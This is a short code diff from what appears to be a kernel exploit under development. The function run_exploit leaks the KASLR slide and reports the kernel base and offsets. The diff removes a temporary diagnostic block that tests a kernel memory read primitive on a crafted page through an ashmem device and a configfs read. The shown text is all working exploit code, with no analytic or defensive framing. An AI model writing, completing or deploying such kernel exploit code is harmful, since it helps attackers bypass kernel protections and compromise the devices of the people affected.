@@ -429,20 +429,6 @@ int run_exploit(int argc, char **argv) {
         pr_error("slide kaslr leak failed\n");
         return 1;
     }
-    
-    /* >>> TEMPORARY: test primitive on a real page <<< */
-    {
-        page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
-        if (page_base) {
-            uint64_t val = 0;
-            int fd = open_ashmem_device();
-            ssize_t ret = configfs_read_once(fd, page_base, &val, sizeof(val));
-            pr_info("DIAG: real-page test addr=%016zx ret=%zd val=%016llx errno=%d\n",
-                    page_base, ret, (unsigned long long)val, errno);
-            close(fd);
-        }
-    }
-    /* >>> END TEMPORARY <<< */
   if (getenv("SLIDE_ONLY") || getenv("P0_ONLY")) {
     pr_success("slide-only done base=%016zx slide=%016zx p0_offset=%08zx\n",
                kaslr_base, kaslr_slide, slide_p0_offset);
